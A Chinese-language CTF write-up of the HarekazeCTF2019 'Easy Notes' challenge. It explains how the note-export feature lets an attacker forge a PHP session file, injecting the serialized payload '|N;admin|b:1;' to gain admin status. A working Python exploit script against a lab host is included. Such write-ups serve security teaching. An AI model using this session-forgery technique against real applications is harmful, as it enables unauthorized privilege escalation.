# \[HarekazeCTF2019]Easy Notes

## \[HarekazeCTF2019]Easy Notes

## 考点

* PHP session反序列化
* PHP代码审计
* PHP session 伪造

## wp

给了源码，打开靶机，是一个笔记系统

![](../../.gitbook/assets/Harekaze2019\_notes\_1.png)

在登陆处进行了匹配，只允许输入 4 到 64 位规定字符，且不是前端验证

![](../../.gitbook/assets/Harekaze2019\_notes\_2.png)

登陆成功后，可以进行增删查和导出为 zip 或 tar 的功能，点击 `Get flag` 提示不是 admin

既然拿到源码就先看看全局配置 `config.php` ，就写了一行，定义临时文件目录



![](<../../.gitbook/assets/image (11) (1).png>)

还要看一下初始化文件`init.php`，定义`session`存储位置

![](<../../.gitbook/assets/image (22) (1) (1) (1) (1).png>)

进入 `page/flag.php` 看一下给出 flag 的条件，要满足 `is_admin()` 函数

![](../../.gitbook/assets/Harekaze2019\_notes\_3.png)

跟进 `is_admin()` 函数，没有发现什么可以利用的地方

![](../../.gitbook/assets/Harekaze2019\_notes\_4.png)

看到有个导出功能，它会将添加的 note 导出为 zip，这个文件存放的位置在 `TEMP_DIR` ，和 `session` 信息保存在同一个位置，那么是不是可以考虑伪造 session

![](<../../.gitbook/assets/image (5) (1).png>)

session 文件以 `sess_` 开头，且只含有 `a-z`，`A-Z`，`0-9`，`-`

看到 `$filename` 处可以满足所有的条件

![](../../.gitbook/assets/Harekaze2019\_notes\_5.png)

构造 `user` 为 `sess_` ，`type` 为 `.` ，经过处理之后，`$path` 就是 `TEMP_DIR/sess_0123456789abcdef` 这就伪造了一个 session 文件

然后向这个文件写入 note 的 `title`

![](../../.gitbook/assets/Harekaze2019\_notes\_6.png)

在最后，它会将构造的 `$filename` 返回，这样就知道了伪造的 session 文件，就可以拿到构造出的 admin 的 session 数据

![](../../.gitbook/assets/Harekaze2019\_notes\_7.png)

最后构造 `session` 触发反序列化使 `is_admin` 返回 `ture` 。

可以看到在导出时，会将 `titl`e 写入伪造的 `session` 文件中

那么就可以在 `title` 处构造序列化字符串，而 php 默认的 `session handler`是 `php`，其存储方式为 `键名+竖线+经过serialize函数序列处理的值`&#x20;

这里 `title` 就构造为 `|N;admin|b:1;` 这样就会满足了 `is_admin`的条件

梳理一下思路

第一步，以 sess\_ 登陆

第二步，添加标题为 `|N;admin|b:1; 的 note`

第三步，访问 export.php?type=. 伪造 session

第四步，获取伪造的 session 进行 get flag

exp

```python
import re
import requests
URL = 'http://192.168.233.136:9000/'

while True:
	# login as sess_
	sess = requests.Session()
	sess.post(URL + 'login.php', data={
		'user': 'sess_'
	})

	# make a crafted note
	sess.post(URL + 'add.php', data={
		'title': '|N;admin|b:1;',
		'body': 'hello'
	})

	# make a fake session
	r = sess.get(URL + 'export.php?type=.').headers['Content-Disposition']
	print(r)
	
	sessid = re.findall(r'sess_([0-9a-z-]+)', r)[0]
	print(sessid)
	
	# get the flag
	r = requests.get(URL + '?page=flag', cookies={
		'PHPSESSID': sessid
	}).content.decode('utf-8')
	flag = re.findall(r'flag\{.+\}', r)

	if len(flag) > 0:
		print(flag[0])
		break
```

## 小结

1. &#x20;php 默认的 `session handler`是 `php`，其存储方式为 `键名+竖线+经过serialize函数序列处理的值`&#x20;
2. session 文件以 `sess_` 开头，且只含有 `a-z`，`A-Z`，`0-9`，`-`
